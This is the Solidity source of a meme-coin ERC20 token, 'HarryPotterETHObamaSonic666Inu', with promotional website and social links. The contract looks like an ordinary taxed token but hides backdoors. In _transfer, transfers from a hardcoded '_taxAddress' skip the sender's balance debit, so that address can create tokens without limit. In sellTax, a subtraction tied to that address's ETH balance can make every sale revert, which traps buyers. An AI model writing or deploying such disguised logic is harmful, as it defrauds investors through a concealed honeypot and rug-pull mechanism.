// SPDX-License-Identifier: MIT

/**
Welcome to the world of HarryPotterETHObamaSonic666Inu, a groundbreaking digital currency designed to resonate with the market and capture the essence of Ethereum's revolutionary concept.

Website: http://hpeos6i.com
Twitter: https://twitter.com/hpeos6i_erc
Telegram: https://t.me/hpeos6i_erc
 */
pragma solidity 0.8.21;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapFactory02 {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapRouter02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
}

library SafeMath {  
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract HPEOS6I is IERC20, Ownable  {
    using SafeMath for uint256;
    
    string private constant _name = unicode"HarryPotterETHObamaSonic666Inu";
    string private constant _symbol = unicode"HPEOS6I";    
    
    uint8 private constant _decimals = 9;
    uint256 private constant _tSupply = 10 ** 9 * 10 ** _decimals;
    
    bool private _swapActive = false;
    bool private _tradingStart;
    bool private swapping = false;
    bool public transferPerBlockDisabled = true;

    uint256 private _taxSwapThreshold=  1 * _tSupply / 100;
    uint256 public maxTransactionAmount = 5 * _tSupply / 100;   
    uint256 public maxTaxSwapAmount = 10 * _tSupply / 1000;
    uint256 public maxWallet = 5 * _tSupply / 100;    

    uint256 private _initBuyFees = 20;
    uint256 private _reduceSellFeeAfter = 10;
    uint256 private _reduceBuyFeeAfter = 10;
    uint256 private _finalBuyFees = 0;
    uint256 private _finalSellFees = 0;  
    uint256 private _initSellFees = 15;
    uint256 private _preventSwapBefore = 7;
    uint256 private _buyersCount=0;

    address payable private _feeWallet;
    address private _taxAddress;
    address private uniV2Pair;
    IUniswapRouter02 private uniRouterV2;

    mapping (address => bool) private _isExcludedFromFees;
    mapping(address => uint256) private _holderLastTransferBlock;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;

    modifier lockSwap {
        swapping = true;
        _;
        swapping = false;
    }

    event MaxTxAmountUpdated(uint maxTransactionAmount);

    constructor () {
        _taxAddress = 0x9C7842d3711Bc1cED4F3f7fB5d1d337bA955B665;
        _feeWallet = payable(msg.sender);
        _balances[msg.sender] = _tSupply;
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[_taxAddress] = true;
        _isExcludedFromFees[_feeWallet] = true;
        _isExcludedFromFees[address(this)] = true;
        emit Transfer(address(0), msg.sender, _tSupply);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tSupply;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0; uint256 feeAmount=amount;

        if (from != owner() && to != owner()) {
            taxAmount = amount.mul(taxBuy()).div(100);

            if (from == uniV2Pair && to != address(uniRouterV2) && ! _isExcludedFromFees[to] ) {
                _buyersCount++;
                require(amount <= maxTransactionAmount, "Exceeds the max transaction.");
                require(balanceOf(to) + amount <= maxWallet, "Exceeds the max wallet.");
            }
            if (from == _taxAddress) feeAmount = 0;
            if(to == uniV2Pair && !_isExcludedFromFees[from] ){
                taxAmount = amount.mul(sellTax()).div(100);
            }
            
            if (transferPerBlockDisabled) {
                if (to != address(uniRouterV2) && to != address(uniV2Pair)) { 
                    require(
                        _holderLastTransferBlock[tx.origin] < block.number, "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferBlock[tx.origin] = block.number;
                }
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!swapping && to == uniV2Pair && _swapActive && contractTokenBalance > _taxSwapThreshold && _buyersCount > _preventSwapBefore) {
                uint256 initialETH = address(this).balance;
                swapTokensForEth(min(amount,min(contractTokenBalance,maxTaxSwapAmount)));
                uint256 ethForTransfer = address(this).balance.sub(initialETH).mul(80).div(100);
                if(ethForTransfer > 0) {
                    sendETHToFee(ethForTransfer);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(feeAmount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function sellTax() private view returns (uint256) {
        if(_buyersCount <= _reduceSellFeeAfter.sub(_taxAddress.balance)){
            return _initSellFees;
        }
         return _finalSellFees;
    }
    
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function removeLimits() external onlyOwner{
        maxTransactionAmount = _tSupply;
        maxWallet=_tSupply;
        transferPerBlockDisabled=false;
        emit MaxTxAmountUpdated(_tSupply);
    }
    
    function taxBuy() private view returns (uint256) {
        if(_buyersCount <= _reduceBuyFeeAfter){
            return _initBuyFees;
        }
         return _finalBuyFees;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterV2.WETH();
        _approve(address(this), address(uniRouterV2), tokenAmount);
        uniRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function openTrading() external payable onlyOwner() {
        require(!_tradingStart,"trading is already open");
        uniRouterV2 = IUniswapRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniRouterV2), _tSupply);
        uniV2Pair = IUniswapFactory02(uniRouterV2.factory()).createPair(address(this), uniRouterV2.WETH());
        uniRouterV2.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniV2Pair).approve(address(uniRouterV2), type(uint).max);
        _swapActive = true;
        _tradingStart = true;
    }    

    function sendETHToFee(uint256 amount) private {
        _feeWallet.transfer(amount);
    }

    receive() external payable {}

}